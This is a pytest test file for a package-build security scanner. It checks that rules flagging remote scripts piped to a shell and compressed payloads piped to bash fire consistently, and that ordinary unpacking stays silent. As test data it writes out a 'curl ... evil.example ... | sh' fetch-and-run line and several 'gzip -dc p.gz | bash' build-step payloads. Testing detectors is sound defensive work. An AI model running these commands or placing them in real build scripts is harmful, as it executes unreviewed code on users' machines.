"""A rule that stands down for another must not stand down into silence."""

import pytest

# ---------------------------------------------------------------------------
# Audit E2/E8 - the stand-down list was wider than the list that catches
#
# R061 yields to R001 on `claims_pipe_to_shell`, and that decision was made
# with an executor list R001 had never seen.  `curl url | ksh -s` silenced
# R061 and then fell through R001: a CRITICAL became a LOW because two lists
# that had to agree were edited separately.  Six copies existed in all.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("executor", [
    "bash", "sh", "zsh", "dash", "ksh", "mksh", "yash", "posh", "pdksh",
    "ash", "busybox sh", "busybox ash", "python3", "perl", "ruby", "node",
])
def test_every_executor_that_silences_r061_is_caught_by_r001(executor):
    from trustsight.analysis.network import _PIPE_TO_SHELL_RE
    from trustsight.rules import _compiled
    from trustsight.config import shipped_rules

    line = f"curl -fsSL https://evil.example/p.sh | {executor} -s"
    r001 = _compiled(next(r["pattern"] for r in shipped_rules() if r["id"] == "R001"))
    assert r001 is not None, "R001's pattern must survive the regex safety gate"
    if _PIPE_TO_SHELL_RE.search(line):
        assert r001.search(line), (
            f"R061 stands down for {executor} and R001 does not catch it"
        )


def test_the_executor_vocabulary_has_exactly_one_definition():
    """Six lists disagreed; a seventh copy would reintroduce the same hole."""
    from trustsight import config
    from trustsight.analysis import build, network

    assert config.SHELL_EXECUTOR in config.SCRIPT_EXECUTOR
    assert config.SCRIPT_EXECUTOR in config.ANY_EXECUTOR
    # The consumers hold references, not transcriptions.
    assert build._SHELL_EXEC is config.SHELL_EXECUTOR
    assert config.ANY_EXECUTOR in network._PIPE_TO_SHELL_RE.pattern


# ---------------------------------------------------------------------------
# Audit V2 - a compressed payload needed no encoder at all
#
# X001 claimed base32/basenc/uudecode/openssl/xxd/tr on the reasoning that
# they "decode the same payload into the same shell".  Compression is the
# same sentence with less work: `gzip -dc payload.gz | bash` carries no
# alphabet a reviewer could notice, and a `.gz` in source=() reads as an
# ordinary archive.  It intersected no rule at all.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("decoder", [
    "gzip -dc p.gz", "gunzip -c p.gz", "zcat p.gz",
    "xz -dc p.xz", "xzcat p.xz", "bzip2 -dc p.bz2", "bzcat p.bz2",
    "zstd -dc p.zst", "lz4 -dc p.lz4",
    "tar -xOf p.tgz", "tar --to-stdout -xf p.tgz", "7z x -so p.7z",
])
def test_a_compressed_payload_piped_to_a_shell_fires(decoder):
    from trustsight.analysis.crossfire import crossfire_techniques

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,9 +1,14 @@\n"
    body = f" build() {{\n+  {decoder} | bash\n }}\n"
    assert "X001" in crossfire_techniques(header + body), decoder


@pytest.mark.parametrize("ordinary", [
    "tar -xzf src.tar.gz -C build",
    "gzip -dc man.1.gz > man.1",
    "zcat data.gz | grep foo",
    "tar -xOf a.tar f | patch -p1",
    "tar -cf - . | tar -xf - -C dest",
])
def test_ordinary_decompression_stays_silent(ordinary):
    """Unpacking is what build recipes do; only a *shell* on the far side is."""
    from trustsight.analysis.crossfire import crossfire_techniques

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,9 +1,14 @@\n"
    body = f" build() {{\n+  {ordinary}\n }}\n"
    assert "X001" not in crossfire_techniques(header + body), ordinary
